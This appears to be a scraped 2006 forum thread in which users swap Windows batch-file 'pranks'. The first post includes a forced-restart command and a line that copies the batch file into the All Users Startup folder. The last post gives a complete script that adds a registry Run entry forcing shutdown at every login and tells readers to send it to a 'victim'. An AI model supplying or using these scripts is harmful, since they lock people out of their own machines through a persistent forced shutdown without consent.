channel.title: Makin some cool commands for a .bat
channel.description:
shutdown -r -f -c "haha noob"
lmao im playin pranks on friends makin .bats ^^ is my first
is there a way to make it so after that thing shuts down comp it will execute itself once a user loggs in XD again or a cmd to add it to startup menu XD ??[br][size=1]Posted at: July 12, 2006, 01:11:21 AM[/size][hr]lmao nvm i found this:
copy "*.bat" "c:Documents and SettingsAll UsersStart MenuProgramsStartupSys32.bat" shutdown -t 5 -r -f -c "LMAO OWNED BY GOAT SPIRIT!"

item.title: Makin some cool commands for a .bat
item.dc:creator: @frank frank_
item.description:
@frank wrote:

[quote=“dragan587, post:11, topic:4735”]@echo off
:start
echo you got owned!!!
goto start

i wish java was as easy as batch[/quote]

while (true) { System.out.println("you smell like moparscape"); }

item.title: Makin some cool commands for a .bat
item.dc:creator: @frank frank_
item.description:
@frank wrote:

“@echo off” just stops the command prompt printing the current working directory everytime you execute a command

Read full topic

or if u want to make a message display on the batch file,
do this

echo MESSAGE

item.title: Makin some cool commands for a .bat
item.dc:creator: @suck_my_r2h suck my r2h
item.description:
@suck_my_r2h wrote:

There is a way to make the computer shut down once the user logs in
Make a new txt file and save it as whatever.bat, add the following commands to it:

@ECHO off CLS ECHO REGEDIT4 >> temp.reg ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "ownage"="shutdown.exe -s -t 00" >> temp.reg REM Remember to enter in two NUMERIC zeroes (00) after -t in the line above, REM and not the letter "O" REGEDIT.EXE /s temp.reg SHUTDOWN.EXE -s -t 00
Send it to the victim and tell them to run it

Read full topic
